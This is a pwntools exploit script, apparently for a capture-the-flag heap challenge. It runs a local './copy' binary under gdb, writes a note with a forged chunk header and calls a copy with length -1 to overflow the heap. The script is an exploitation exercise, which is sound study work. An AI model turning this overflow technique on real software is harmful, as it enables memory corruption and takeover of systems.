from pwn import *

context.terminal = ['tmux','splitw' ,'-h']

#p = process('./vuln')
p = gdb.debug("./copy", '''
set max-visualize-chunk-size 0x500
handle SIGALRM nostop noprint
set resolve-heap-via-heuristic force''')

# Menu Option
p.recvuntil(b'> ')
p.sendline(b'0')

# size:
p.recvuntil(b'size: ')
p.sendline(b'8')

# note content (fgets)
p.sendline(b'B' * 8)


# Menu Option
p.recvuntil(b'> ')
p.sendline(b'0')

# size:
p.recvuntil(b'size: ')
p.sendline(b'256')

# note content (fgets)
p.sendline(b'A' * 224 + p64(0x0) + p64(0x21) + b'C' * (256 - 224 - 8 - 8))

# Copy
p.recvline()
p.sendline(b'1')

# Dst
p.recvline()
p.sendline(b'0')

# Src
p.recvline()
p.sendline(b'1')

# Len
p.recvline()
p.sendline(b'-1')


# interact with the program if needed
p.interactive()

